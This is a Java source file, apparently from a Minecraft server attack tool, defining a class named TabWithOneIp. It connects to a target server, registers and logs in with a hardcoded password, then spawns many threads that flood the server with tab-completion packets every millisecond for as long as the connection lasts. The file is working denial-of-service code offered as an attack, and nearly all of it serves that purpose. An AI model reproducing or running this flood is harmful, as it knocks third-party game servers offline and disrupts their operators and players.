package me.alikomi.endminecraft.tasks.attack;

import com.google.common.base.Charsets;
import com.sun.corba.se.pept.transport.ByteBufferPool;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import me.alikomi.endminecraft.tasks.attack.forge.GetModList;
import me.alikomi.endminecraft.utils.DefinedPacket;
import me.alikomi.endminecraft.utils.Util;
import org.apache.commons.lang3.Validate;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerTabCompletePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.nio.ByteBuffer;
import java.util.*;

public class TabWithOneIp extends Util {

    private static String ip;
    private static int port;
    private static int thread;
    private static String username;

    public TabWithOneIp(String ip, int port, int thread, String username) {
        this.ip = ip;
        this.port = port;
        this.thread = thread;
        this.username = username;
    }

    public static byte[] subBytes(byte[] src, int begin, int count) {
        byte[] bs = new byte[count];
        System.arraycopy(src, begin, bs, 0, count);
        return bs;
    }

    public static byte[] fb(byte[] old) {
        if (old.length <= 0) {
            log("1");
            return old;
        }
        for (int i = old.length - 1; i >= 0; i--) {
            if (old[i] != (byte) 0) {
                return subBytes(old, 0, ++i);
            }
        }
        return old;
    }

    public void startAttack() {
        MinecraftProtocol protocol = new MinecraftProtocol(username);
        Client mc = new Client(ip, port, protocol, new TcpSessionFactory());
        mc.getSession().addListener(new SessionListener() {
            @Override
            public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {
                    mc.getSession().send(new ClientChatPacket("/register qwnmopzx123 qwnmopzx123"));
                    mc.getSession().send(new ClientChatPacket("/login qwnmopzx123"));
                    for (int i = 0; i < thread; i++) {
                        new Thread(() -> {
                            while (mc.getSession().isConnected()) {
                                mc.getSession().send(new ClientTabCompletePacket("/"));
                                try {
                                    Thread.sleep(1);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }
                            }
                        }).start();
                    }
                }
                if (packetReceivedEvent.getPacket() instanceof ServerChatPacket) {
                    log("聊天：" + ((ServerChatPacket) packetReceivedEvent.getPacket()).getMessage().getFullText());
                }
            }

            @Override
            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            @Override
            public void connected(ConnectedEvent connectedEvent) {

            }

            @Override
            public void disconnecting(DisconnectingEvent disconnectingEvent) {

            }

            @Override
            public void disconnected(DisconnectedEvent disconnectedEvent) {
                log("断开连接：" + disconnectedEvent.getReason());
            }
        });
        mc.getSession().connect();
    }


}